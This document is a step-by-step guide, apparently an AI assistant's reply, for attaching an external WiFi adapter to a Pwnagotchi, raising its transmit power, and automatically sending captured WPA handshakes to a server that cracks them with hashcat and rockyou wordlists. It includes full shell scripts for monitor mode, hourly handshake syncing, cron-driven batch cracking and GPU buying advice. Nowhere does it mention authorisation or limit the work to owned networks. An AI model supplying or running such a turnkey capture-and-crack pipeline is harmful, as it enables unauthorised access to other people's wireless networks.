# Pwnagotchi External WiFi + Self-Hosted Cracking Setup Guide

## Part 1: External WiFi Adapter Setup (Raspberry Pi Zero W2)

### Prerequisites
- Raspberry Pi Zero W2 with Pwnagotchi running
- External USB WiFi adapter (with monitor mode support)
- USB OTG adapter/cable
- SSH access to your Pwnagotchi

### Step 1: Identify Your USB WiFi Adapter

SSH into your Pwnagotchi and run:

```bash
# Before plugging in the adapter
iwconfig

# Plug in your USB WiFi adapter, wait 10 seconds

# After plugging in
iwconfig
lsusb
dmesg | tail -30
```

Look for the new interface (commonly `wlan1`, `wlan2`) and note:
- Interface name
- Chipset (from `lsusb` output)
- Driver being used (from `dmesg`)

**Common chipsets that work well:**
- Ralink RT5370 (rt2800usb driver)
- Atheros AR9271 (ath9k_htc driver)
- Realtek RTL8188EU/CUS/RU (r8188eu driver)
- MediaTek MT7612U (mt76x2u driver)

### Step 2: Test Monitor Mode Support

```bash
# Test if your adapter supports monitor mode
sudo ip link set wlan1 down
sudo iw dev wlan1 set type monitor
sudo ip link set wlan1 up
iwconfig wlan1  # Should show "Mode:Monitor"

# Test packet injection (important!)
sudo aireplay-ng --test wlan1
# Should show: "Injection is working!"
```

### Step 3: Configure Pwnagotchi to Use External Adapter

Edit your Pwnagotchi config:

```bash
sudo nano /etc/pwnagotchi/config.toml
```

Add/modify these settings:

```toml
[main]
# Change interface to your external adapter
iface = "wlan1mon"  # or whatever your external interface is

# Important: Update monitor mode commands
mon_start_cmd = "sudo ifconfig wlan1 down && sudo iwconfig wlan1 mode monitor && sudo ifconfig wlan1 up"
mon_stop_cmd = "sudo ifconfig wlan1 down && sudo iwconfig wlan1 mode managed && sudo ifconfig wlan1 up"

# Optional: Disable internal WiFi to save power
# (do this after you've confirmed external adapter works)
```

**Alternative: Create custom monitor start script**

```bash
sudo nano /usr/bin/monstart-external
```

```bash
#!/bin/bash
# Monitor mode start script for external adapter

IFACE="wlan1"
MON_IFACE="${IFACE}mon"

# Kill interfering processes
sudo airmon-ng check kill

# Bring interface down
sudo ip link set $IFACE down

# Set monitor mode
sudo iw dev $IFACE set type monitor

# Bring interface up
sudo ip link set $IFACE up
sudo ip link set $MON_IFACE up 2>/dev/null

# Set to channel 1 (pwnagotchi will hop)
sudo iw dev $MON_IFACE set channel 1

echo "Monitor mode enabled on $MON_IFACE"
```

```bash
sudo chmod +x /usr/bin/monstart-external
```

Update config to use this script:
```toml
mon_start_cmd = "/usr/bin/monstart-external"
```

### Step 4: Optimize TX Power

Increase transmission power for better range:

```bash
# Check current power
iw dev wlan1mon info | grep txpower

# Set to maximum (usually 20-30 dBm depending on region/adapter)
sudo iw dev wlan1mon set txpower fixed 3000  # 30 dBm

# Or add to your monstart script:
# sudo iw dev $MON_IFACE set txpower fixed 3000
```

**Add to config for persistence:**
```toml
[main]
# Add custom command after monitor mode starts
mon_start_cmd = "/usr/bin/monstart-external && sleep 2 && sudo iw dev wlan1mon set txpower fixed 3000"
```

### Step 5: Restart and Test

```bash
sudo systemctl restart pwnagotchi
sudo journalctl -u pwnagotchi -f  # Watch the logs
```

Look for:
- Monitor interface found
- WiFi recon starting
- APs being detected

### Troubleshooting External WiFi

**Issue: Adapter not detected**
```bash
# Check USB power issues (Zero W has limited power)
lsusb -v | grep -i power
# Look for "MaxPower" - if >500mA, you may need powered USB hub

# Check kernel messages
dmesg | grep -i "usb\|wifi\|wlan"
```

**Issue: Monitor mode fails**
```bash
# Some adapters need firmware
sudo apt-get update
sudo apt-get install firmware-ralink firmware-realtek firmware-atheros

# Reboot after installing firmware
sudo reboot
```

**Issue: No packets captured**
```bash
# Verify monitor mode
iwconfig wlan1mon  # Should show Mode:Monitor

# Manual capture test
sudo airodump-ng wlan1mon
# Should see APs and clients

# Check if internal WiFi is interfering
sudo rfkill list
# Unblock all or specifically your adapter
sudo rfkill unblock all
```

### Step 6: Disable Internal WiFi (Optional - Power Saving)

Once external adapter is working:

```bash
# Disable internal WiFi (brcmfmac)
sudo nano /etc/modprobe.d/blacklist-internal-wifi.conf
```

Add:
```
blacklist brcmfmac
blacklist brcmutil
```

**Or use device tree overlay:**
```bash
sudo nano /boot/config.txt
```

Add:
```
dtoverlay=disable-wifi
```

```bash
sudo reboot
```

---

## Part 2: Self-Hosted Cracking Server Setup

### Architecture Overview

```
[Pwnagotchi] → captures handshakes → stores in /home/pi/handshakes/
                     ↓
          (transfer via rsync/scp)
                     ↓
[Linux Server] → processes .pcap files → runs hashcat → cracks passwords
```

### Step 1: Install Required Software on Server

```bash
# Update system
sudo apt-get update && sudo apt-get upgrade -y

# Install hashcat and dependencies
sudo apt-get install -y hashcat hcxtools hcxdumptool

# Or install latest hashcat from source for best performance
cd /tmp
wget https://hashcat.net/files/hashcat-6.2.6.tar.gz
tar xvf hashcat-6.2.6.tar.gz
cd hashcat-6.2.6
sudo make install

# Install NVIDIA drivers if you have NVIDIA GPU
sudo apt-get install -y nvidia-driver-535 nvidia-cuda-toolkit
# Check installation
nvidia-smi

# Install AMD ROCm if you have AMD GPU
# Follow: https://rocmdocs.amd.com/en/latest/Installation_Guide/Installation-Guide.html
```

### Step 2: Create Handshake Processing Directory Structure

```bash
# Create directories
mkdir -p ~/pwnagotchi-cracking/{incoming,processing,cracked,failed,wordlists,hashes}

cd ~/pwnagotchi-cracking
```

### Step 3: Set Up SSH Key Authentication (Pwnagotchi → Server)

On your Pwnagotchi:
```bash
# Generate SSH key if not exists
ssh-keygen -t ed25519 -C "pwnagotchi@raspberrypi"

# Copy to server
ssh-copy-id user@your-server-ip
```

### Step 4: Create Automatic Transfer Script (on Pwnagotchi)

```bash
sudo nano /usr/local/bin/sync-handshakes
```

```bash
#!/bin/bash
# Sync handshakes to cracking server

SERVER_USER="your-username"
SERVER_IP="your-server-ip"
SERVER_PATH="/home/${SERVER_USER}/pwnagotchi-cracking/incoming/"
LOCAL_PATH="/home/pi/handshakes/"

# Only sync .pcap files modified in last 24 hours
find "$LOCAL_PATH" -name "*.pcap" -mtime -1 -exec rsync -avz --progress {} ${SERVER_USER}@${SERVER_IP}:${SERVER_PATH} \;

logger "Pwnagotchi handshakes synced to server"
```

```bash
sudo chmod +x /usr/local/bin/sync-handshakes
```

**Add cron job to run hourly:**
```bash
sudo crontab -e
```

Add:
```
0 * * * * /usr/local/bin/sync-handshakes
```

### Step 5: Create Processing Script (on Server)

```bash
nano ~/pwnagotchi-cracking/process-handshakes.sh
```

```bash
#!/bin/bash
# Process incoming handshakes and crack them

SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
INCOMING="$SCRIPT_DIR/incoming"
PROCESSING="$SCRIPT_DIR/processing"
CRACKED="$SCRIPT_DIR/cracked"
FAILED="$SCRIPT_DIR/failed"
HASHES="$SCRIPT_DIR/hashes"
WORDLISTS="$SCRIPT_DIR/wordlists"

# Wordlist priority order
WORDLISTS_PRIORITY=(
    "$WORDLISTS/rockyou.txt"
    "$WORDLISTS/weakpass_3a.txt"
    "$WORDLISTS/custom-wifi.txt"
)

LOG_FILE="$SCRIPT_DIR/cracking.log"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# Process each PCAP file
for pcap in "$INCOMING"/*.pcap; do
    [ -e "$pcap" ] || continue

    filename=$(basename "$pcap")
    hashfile="$HASHES/${filename%.pcap}.22000"

    log "Processing: $filename"

    # Move to processing
    mv "$pcap" "$PROCESSING/"

    # Convert to hashcat format
    hcxpcapngtool -o "$hashfile" "$PROCESSING/$filename" >> "$LOG_FILE" 2>&1

    if [ ! -s "$hashfile" ]; then
        log "ERROR: No valid handshakes in $filename"
        mv "$PROCESSING/$filename" "$FAILED/"
        continue
    fi

    log "Valid handshake(s) found in $filename"

    # Try each wordlist
    for wordlist in "${WORDLISTS_PRIORITY[@]}"; do
        if [ ! -f "$wordlist" ]; then
            log "Wordlist not found: $wordlist"
            continue
        fi

        log "Attempting crack with $(basename $wordlist)..."

        # Run hashcat
        hashcat -m 22000 "$hashfile" "$wordlist" \
            --outfile="$CRACKED/${filename%.pcap}.cracked" \
            --outfile-format=2 \
            --quiet \
            --force \
            >> "$LOG_FILE" 2>&1

        # Check if cracked
        hashcat -m 22000 "$hashfile" --show > /tmp/hashcat_check

        if [ -s /tmp/hashcat_check ]; then
            log "SUCCESS: Cracked $filename"
            cat /tmp/hashcat_check >> "$CRACKED/${filename%.pcap}.cracked"

            # Send notification (optional)
            # curl -X POST ... or send email

            mv "$PROCESSING/$filename" "$CRACKED/"
            break
        fi
    done

    # If still not cracked, mark as failed
    if [ -f "$PROCESSING/$filename" ]; then
        log "FAILED: Could not crack $filename with available wordlists"
        mv "$PROCESSING/$filename" "$FAILED/"
    fi

    rm -f /tmp/hashcat_check
done

log "Batch processing complete"
```

```bash
chmod +x ~/pwnagotchi-cracking/process-handshakes.sh
```

### Step 6: Download Wordlists

```bash
cd ~/pwnagotchi-cracking/wordlists

# Download rockyou
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# Download WeakPass
# wget https://weakpass.com/wordlist/1851  # Large file!

# Create custom WiFi wordlist
nano custom-wifi.txt
# Add common patterns:
# password123
# password2024
# CompanyName2024
# etc.
```

### Step 7: Set Up Automatic Processing

```bash
# Add to crontab
crontab -e
```

Add:
```
*/15 * * * * /home/your-username/pwnagotchi-cracking/process-handshakes.sh
```

### Step 8: Create Status Monitor Script

```bash
nano ~/pwnagotchi-cracking/status.sh
```

```bash
#!/bin/bash
# Show cracking status

SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

echo "======================================"
echo "PWNAGOTCHI CRACKING STATUS"
echo "======================================"
echo ""
echo "Incoming handshakes:  $(ls -1 $SCRIPT_DIR/incoming/*.pcap 2>/dev/null | wc -l)"
echo "Currently processing: $(ls -1 $SCRIPT_DIR/processing/*.pcap 2>/dev/null | wc -l)"
echo "Successfully cracked: $(ls -1 $SCRIPT_DIR/cracked/*.cracked 2>/dev/null | wc -l)"
echo "Failed attempts:      $(ls -1 $SCRIPT_DIR/failed/*.pcap 2>/dev/null | wc -l)"
echo ""
echo "Recent cracks:"
if [ -d "$SCRIPT_DIR/cracked" ]; then
    find "$SCRIPT_DIR/cracked" -name "*.cracked" -mtime -7 -exec echo "- {}" \; | head -10
fi
echo ""
echo "Hashcat devices:"
hashcat -I 2>/dev/null | grep -A1 "Backend"
echo ""
echo "======================================"
```

```bash
chmod +x ~/pwnagotchi-cracking/status.sh
```

### Step 9: Optimize Hashcat Performance

Create a hashcat config file:

```bash
nano ~/.hashcat/hashcat.conf
```

```
# Workload profile (3 = high, 4 = insane but may freeze desktop)
workload-profile = 3

# Kernel accel (auto-tune or set manually)
kernel-accel = 0

# Kernel loops (auto-tune or set manually)
kernel-loops = 0

# Kernel threads (auto-tune)
kernel-threads = 0

# Enable optimized kernels
optimized-kernel-enable = true
```

---

## Part 3: Hardware Upgrade Decision Matrix

### What to Look For in System Info

**CPU Analysis:**
- **Model**: Look for generation (newer = better)
- **Cores**: More cores help but GPU is 1000x more important for hashcat
- **AES-NI support**: Check CPU flags for "aes" - speeds up WPA2 cracking 2-3x
- **Verdict**: CPU is secondary; only upgrade if no AES-NI support

**GPU Analysis (CRITICAL):**
- **NVIDIA**: Best hashcat support
  - RTX 4090: ~1,200,000 H/s (WPA2)
  - RTX 4070: ~500,000 H/s
  - RTX 3060: ~300,000 H/s
  - GTX 1660: ~150,000 H/s

- **AMD**: Good with ROCm but less tested
  - RX 7900 XTX: ~800,000 H/s
  - RX 6800 XT: ~500,000 H/s

- **Integrated/None**: ~5,000-10,000 H/s (CPU only)
  - **Verdict**: UPGRADE GPU if budget allows

**Memory Analysis:**
- **Minimum**: 8 GB RAM (for basic operation)
- **Recommended**: 16 GB+ if running large wordlists
- **Verdict**: RAM rarely bottleneck for hashcat

**Storage Analysis:**
- **Wordlist space**: 100GB+ recommended for large collections
- **PCAP storage**: Minimal (MB not GB)
- **Speed**: SSD recommended but not critical
- **Verdict**: Ensure adequate space for wordlists

### Budget-Based Recommendations

**$0-100: Software optimization only**
- Use cloud GPU services (vast.ai, runpod.io)
- ~$0.20/hour for RTX 4090
- Only pay when cracking

**$200-400: Entry GPU**
- Used RTX 3060 (~$250)
- Used GTX 1660 Super (~$150)
- 10-30x speedup vs CPU

**$500-800: Mid-range GPU**
- RTX 4060 Ti (~$400)
- RTX 4070 (~$600)
- AMD RX 7700 XT (~$450)
- 50-100x speedup vs CPU

**$1000-2000: High-end single GPU**
- RTX 4080 (~$1200)
- RTX 4090 (~$1700)
- 200-300x speedup vs CPU
- Best performance per card

**$2000+: Multi-GPU setup**
- 2-4x mid-range GPUs
- Requires PCIe slots, adequate PSU
- Linear scaling (2 GPUs = 2x speed)

---

## Next Steps

1. **Run the server info collector script** I created:
   ```bash
   chmod +x server_info_collector.sh
   ./server_info_collector.sh > my-server-info.txt
   ```

2. **Share the output** and your budget

3. **Test external WiFi adapter** on Pwnagotchi first

4. **Set up basic cracking infrastructure** before buying hardware

5. **Benchmark current hardware**:
   ```bash
   hashcat -b -m 22000
   ```

Let me know your server specs and I'll give specific upgrade recommendations!
